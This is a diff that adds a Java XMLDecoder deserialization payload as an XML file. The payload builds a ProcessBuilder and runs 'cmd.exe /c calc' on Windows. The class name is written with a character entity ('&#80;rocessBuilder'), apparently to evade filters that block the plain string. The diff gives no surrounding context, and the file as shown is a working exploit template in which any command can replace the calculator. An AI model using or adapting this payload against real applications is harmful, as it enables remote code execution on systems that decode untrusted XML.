@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java>
+	<object class="java.lang.&#80;rocessBuilder">
+		<array class="java.lang.String" length="3">
+			<void index="0">
+				<string>cmd.exe</string>
+			</void>
+			<void index="1">
+				<string>/c</string>
+			</void>
+			<void index="2">
+				<string>calc</string>
+			</void>
+		</array>
+		<void method="start"/>
+	</object>
+</java>
